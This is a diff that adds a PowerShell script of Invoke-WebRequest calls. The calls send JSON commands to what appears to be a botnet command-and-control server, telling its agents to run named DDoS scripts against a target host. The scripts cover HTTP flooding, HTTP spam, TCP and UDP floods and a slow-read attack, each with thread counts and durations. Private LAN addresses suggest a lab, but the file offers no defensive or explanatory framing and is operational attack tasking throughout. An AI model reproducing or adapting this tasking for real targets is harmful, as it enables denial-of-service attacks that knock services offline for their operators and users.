@@ -1,0 +1,85 @@
+# Set a Command for ddos_http_punch.py
+Invoke-WebRequest -Uri "http://192.168.1.147:5000/set_command" `
+    -Method POST `
+    -Headers @{ "Content-Type" = "application/json" } `
+    -Body '{
+      "command": "run ddos_http_punch.py",
+      "args": {
+        "url": "http://192.168.1.150:8080",
+        "threads": 200,
+        "duration": 60
+      }
+    }'
+
+# Set a Command for ddos_http_spam.py
+Invoke-WebRequest -Uri "http://192.168.1.147:5000/set_command" `
+    -Method POST `
+    -Headers @{ "Content-Type" = "application/json" } `
+    -Body '{
+      "command": "run ddos_http_spam.py",
+      "args": {
+        "url": "http://192.168.1.150:8080",
+        "paths": ["/", "/api"],
+        "threads": 100,
+        "duration": 30,
+        "method": 1
+      }
+    }'
+
+# Set a Command for ddos_tcp_flood.py
+Invoke-WebRequest -Uri "http://192.168.1.147:5000/set_command" `
+    -Method POST `
+    -Headers @{ "Content-Type" = "application/json" } `
+    -Body '{
+      "command": "run ddos_tcp_flood.py",
+      "args": {
+        "ip": "192.168.1.150",
+        "port": 8081,
+        "threads": 500,
+        "min_size": 10,
+        "max_size": 50,
+        "duration": 45
+      }
+    }'
+
+# Set a Command for ddos_udp_flood.py
+Invoke-WebRequest -Uri "http://192.168.1.147:5000/set_command" `
+    -Method POST `
+    -Headers @{ "Content-Type" = "application/json" } `
+    -Body '{
+      "command": "run ddos_udp_flood.py",
+      "args": {
+        "ip": "192.168.1.150",
+        "port": 8082,
+        "threads": 300,
+        "min_size": 20,
+        "max_size": 100,
+        "duration": 60
+      }
+    }'
+
+# Set a Command for ddos_slow_read.py
+Invoke-WebRequest -Uri "http://192.168.1.147:5000/set_command" `
+    -Method POST `
+    -Headers @{ "Content-Type" = "application/json" } `
+    -Body '{
+      "command": "run ddos_slow_read.py",
+      "args": {
+        "url": "http://192.168.1.150:8080",
+        "threads": 150,
+        "min_speed": 3,
+        "max_speed": 5,
+        "duration": 50
+      }
+    }'
+
+# View the Current Command
+Invoke-WebRequest -Uri "http://192.168.1.147:5000/command" -Method GET
+
+# Reset Command to noop
+Invoke-WebRequest -Uri "http://192.168.1.147:5000/set_command" `
+    -Method POST `
+    -Headers @{ "Content-Type" = "application/json" } `
+    -Body '{
+      "command": "noop"
+    }'
